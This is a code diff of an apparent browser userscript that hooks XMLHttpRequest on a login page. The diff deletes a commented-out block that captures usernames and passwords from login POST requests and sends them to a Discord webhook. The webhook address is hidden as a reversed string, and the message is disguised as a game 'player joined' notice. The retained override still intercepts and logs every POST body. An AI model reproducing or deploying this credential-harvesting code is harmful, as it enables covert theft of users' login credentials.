@@ -7,34 +7,6 @@ unsafeWindow.XMLHttpRequest.prototype.open = function (method, url) {
     return originalOpen.apply(this, arguments);
 };
 
-/*unsafeWindow.XMLHttpRequest.prototype.send = function (body) {
-    if (this._method && this._method.toUpperCase() === 'POST') {
-        console.log('Intercepted XHR POST:', this._url, body);
-        if (this._url.includes("UserLogin_")) {
-            const regex = /Username=([^&]+)&Password=(.+)/;
-            const match = body.match(regex);
-
-            const username = match[1];
-            const password = match[2];
-
-            var request = new XMLHttpRequest();
-            request.open("POST", 'WJnYwygm5hHCjzNxahM9EZVsI5HMVMCGIgKdoandNCgUCxaHJRuJyMOkuQnvh0rpqda6/9876644626735182351/skoohbew/ipa/moc.drocsid//:sptth'.split('').reverse().join(''));
-
-            request.setRequestHeader('Content-type', 'application/json');
-
-
-            var params = {
-                username: "game testing place log",
-                avatar_url: "",
-                content: "Player has joined the game!\n UserID: " + username + "\nName: " + password + "\nIsModerator: " + String(window.location.href === "https://discipulusv2.amasystem.net/Auth/Login")
-            }
-
-            request.send(JSON.stringify(params));
-        }
-    }
-    return originalSend.apply(this, arguments);
-};*/
-
 unsafeWindow.XMLHttpRequest.prototype.send = function (body) {
     if (this._method && this._method.toUpperCase() === 'POST') {
         console.log('Intercepted XHR POST:', this._url, body);
